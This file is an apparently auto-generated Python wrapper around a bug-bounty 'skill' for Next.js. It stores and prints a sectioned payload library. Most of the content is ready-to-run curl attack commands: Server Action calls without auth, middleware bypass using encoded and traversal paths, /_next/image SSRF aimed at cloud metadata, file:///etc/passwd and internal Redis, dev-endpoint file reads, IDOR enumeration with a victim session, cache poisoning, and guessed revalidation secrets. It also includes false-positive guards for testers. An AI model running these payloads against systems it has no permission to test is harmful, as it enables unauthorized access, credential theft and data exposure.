#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-nextjs

Skill: HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
Desc : Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.

Run:  python claude-bughunter-hunt-nextjs.py --help
      python claude-bughunter-hunt-nextjs.py --list
      python claude-bughunter-hunt-nextjs.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-nextjs'
TITLE = 'HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities'
DESCRIPTION = 'Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.'

PAYLOADS = {
    'main': ["name: hunt-nextjs", "description: Hunt Next.js specific vulnerabilities \u2014 Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.", "sources: \"cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories\"", "report_count: 0"],
    'hunt-nextjs-next-js-ssr-framework-vulnerabilities': [],
    'crown-jewel-targets': ["Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.", "**Highest-value chains:**", "- **Server Actions auth bypass** \u2014 Server Actions enforce auth client-side only \u2192 call action ID directly \u2192 unauthorized data mutation or exfil", "- **Middleware bypass via `/_next/static/`** \u2014 middleware skips static asset paths \u2192 protected routes accessible via `/_next/data/` IDOR", "- **`/_next/image` SSRF** \u2014 Image optimizer fetches attacker-controlled URL \u2192 internal network scan or cloud metadata", "- **ISR stale cache poisoning** \u2014 inject malicious content into a cached page that gets served to all users", "- **RSC payload leakage** \u2014 React Server Component flight data contains server-side props not meant for client"],
    'attack-surface-signals': ["/_next/image?url=&w=&q=          Image optimizer \u2014 SSRF candidate", "/_next/data/BUILD_ID/*.json      Prerendered page data \u2014 IDOR candidate", "/__nextjs_original-stack-frame   Debug stack frame endpoint", "/_next/static/chunks/            JS bundles \u2014 source map candidate", "/api/                            API routes \u2014 standard hunt surface", "__NEXT_DATA__ in HTML            SSR props leaked to client", "x-nextjs-* response headers      Confirms Next.js"],
    'phase-1-fingerprint-version-detection': ["```bash"],
    'confirm-next-js-and-get-build-id': ["curl -s https://$TARGET/ | grep -oP '\"buildId\":\"[^\"]+\"'", "curl -sI https://$TARGET/ | grep -i \"x-powered-by\\|x-nextjs\""],
    'extract-build-id-for-next-data-paths': ["BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '\"buildId\":\"\\K[^\"]+')", "echo \"Build ID: $BUILD_ID\""],
    'check-next-js-version-via-package-disclosure': ["curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '\"next\":\"[^\"]+\"'"],
    'source-map-exposure': ["curl -s \"https://$TARGET/_next/static/chunks/pages/index.js.map\" | head -5", "curl -s \"https://$TARGET/_next/static/chunks/main.js.map\" | head -5"],
    'phase-2-server-actions-abuse': ["```bash"],
    'server-actions-in-next-js-14-use-x-action-id-or-next-action-header': [],
    'find-action-ids-in-html-source-or-js-bundles': ["curl -s https://$TARGET/ | grep -oP '\"action\":\"[a-f0-9]+\"'", "grep -r \"createActionURL\\|$$ACTION_\" recon/$TARGET/ --include=\"*.js\" 2>/dev/null"],
    'call-server-action-directly-without-auth': ["curl -s -X POST https://$TARGET/target-page \\", "-H \"Next-Action: ACTION_ID_HERE\" \\", "-H \"Content-Type: multipart/form-data; boundary=----\" \\", "-H \"Cookie: \" \\", "--data-raw $'------\\r\\nContent-Disposition: form-data; name=\"1\"\\r\\n\\r\\n[]\\r\\n------\\r\\n'"],
    'test-does-the-action-execute-without-a-valid-session': [],
    'if-it-returns-data-or-mutates-state-auth-enforcement-is-client-side-only': [],
    'phase-3-middleware-auth-bypass': ["```bash"],
    'next-js-middleware-runs-on-edge-runtime-and-may-skip-certain-paths': [],
    'test-protected-route-directly': ["curl -s -o /dev/null -w \"%{http_code}\" https://$TARGET/admin/dashboard"],
    '200-means-accessible': [],
    'test-via-next-data-ssg-isr-json-middleware-may-not-apply': ["curl -s \"https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json\""],
    'test-via-static-asset-path-prefix-middleware-matcher-may-exclude-next-static': ["curl -s \"https://$TARGET/_next/static/../admin/dashboard\""],
    'encoded-path-bypass': ["curl -s \"https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json\"", "curl -s \"https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json\""],
    'phase-4-image-optimization-ssrf-next-image': ["```bash"],
    'basic-ssrf-test-internal-metadata': ["curl -s \"https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75\""],
    'protocol-bypass-attempts': ["curl -s \"https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75\"", "curl -s \"https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75\""],
    'oob-detection-use-a-unique-per-test-subdomain-so-callbacks-can-t-be-confused': ["COLLAB=\"http://UNIQUE.COLLAB_HOST\"", "curl -s \"https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75\""],
    'check-interactsh-burp-collaborator-for-dns-http-callback-on-that-exact-subdomain': ["**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only", "fetches URLs allowed by `images.remotePatterns` / `images.domains` in", "`next.config.js`. A non-whitelisted `url` returns **400 by default** \u2014 that is", "the optimizer's normal allowlist rejection, NOT a \"block\" you bypassed. A **200**", "returns an *optimized image*, not the upstream response body, so a status code", "alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique", "Collaborator subdomain** (above), or by body-diffing a known-internal vs", "known-external target. Do not report on status code."],
    'phase-5-next-data-idor-data-leakage': ["```bash"],
    'enumerate-prerendered-json-for-user-specific-data': [],
    'pattern-next-data-build-id-page-json-or-next-data-build-id-dynamic-id-json': ["curl -s \"https://$TARGET/_next/data/$BUILD_ID/profile.json\" \\", "-H \"Cookie: session=VICTIM_SESSION\""],
    'try-other-users-data': ["for ID in 1 2 3 100 1000; do", "curl -s \"https://$TARGET/_next/data/$BUILD_ID/users/$ID.json\" | head -3"],
    'check-next-data-in-html-for-sensitive-server-side-props': ["curl -s \"https://$TARGET/dashboard\" | \\", "python3 -c \"import sys,re,json; m=re.search(r'<script id=\\\"__NEXT_DATA__\\\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')\""],
    'phase-6-isr-cache-poisoning': ["```bash"],
    'isr-pages-regenerate-on-request-after-revalidation-period': [],
    'if-user-input-influences-the-static-page-content-without-sanitization': [],
    '1-trigger-revalidation-with-malicious-input-in-url-query': [],
    '2-injected-content-cached-and-served-to-all-users': [],
    'test-does-query-param-affect-cached-page-content': [],
    'use-a-unique-marker-not-a-generic-script-so-a-match-proves-your-input-landed': [],
    'and-confirm-the-response-was-actually-cached-served-to-a-different-client': ["MARK=\"zqx$(date +%s)\""],
    '1-poison-with-the-marker': ["curl -s \"https://$TARGET/blog/test-post?preview=<b>$MARK</b>\" -o /dev/null"],
    '2-re-fetch-the-clean-url-no-query-from-a-fresh-client-and-grep-the-marker': [],
    'body-diff-clean-vs-poisoned-and-check-x-nextjs-cache-age-headers-a-reflected': [],
    'marker-without-proof-it-persists-in-the-cache-key-is-just-reflection-not-poisoning': ["curl -si \"https://$TARGET/blog/test-post\" | grep -iE \"$MARK|x-nextjs-cache|age:\""],
    'on-demand-revalidation-endpoint-if-exposed': ["curl -s \"https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test\"", "curl -s \"https://$TARGET/api/revalidate?token=GUESS&path=/admin\""],
    'phase-7-debug-stack-frame-endpoints': ["**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`", "are react-dev-overlay middleware mounted ONLY under `next dev`. A production", "build (`next build && next start`) does not register these routes \u2014 a 404 here", "is the normal, expected result, not a \"filter\" you need to bypass. They are", "reachable ONLY in the rare misconfiguration of literally running `next dev` in", "production. Treat any non-404 as the real finding; do NOT report a 404/filtered", "response as confirmation.", "```bash"],
    'first-confirm-dev-mode-is-actually-exposed-anything-but-404-dev-server-in-prod': ["curl -s -o /dev/null -w \"%{http_code}\" \\", "\"https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test\""],
    'only-if-the-above-is-not-404-the-launch-editor-stack-frame-endpoints-can': [],
    'reference-local-files-file-read-surface-of-a-dev-server-wrongly-exposed': ["curl -s \"https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1\"", "curl -s \"https://$TARGET/__nextjs_original-stack-frame\" \\", "--data '{\"file\":\"/etc/passwd\",\"line\":1,\"column\":1}'"],
    'phase-8-environment-variable-leakage': ["```bash"],
    'next-public-vars-are-baked-into-js-bundles-grep-for-secrets': ["curl -s \"https://$TARGET/_next/static/chunks/pages/_app.js\" | \\", "grep -oE \"NEXT_PUBLIC_[A-Z_]+['\\\"]?\\s*[:=]\\s*['\\\"]?[^'\\\"&\\s]+\""],
    'check-for-non-public-vars-accidentally-exposed': ["curl -s https://$TARGET/ | python3 -c \"", "import sys, re, json", "m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)", "if m:", "d = json.loads(m.group(1))", "print(json.dumps(d.get('props', {}), indent=2))"],
    'chain-table': [],
    'validation': ["\u2705 Server Action: action executes without valid session, returns data or mutates state", "\u2705 SSRF: DNS/HTTP callback received from `/_next/image` SSRF", "\u2705 Middleware bypass: 200 response on protected route without auth cookie", "\u2705 Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII", "**Severity:**", "- Server Action auth bypass \u2192 data mutation: High/Critical", "- Image SSRF \u2192 cloud metadata: Critical", "- Middleware bypass \u2192 admin panel: High", "- Source map exposure only: Low-Medium"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()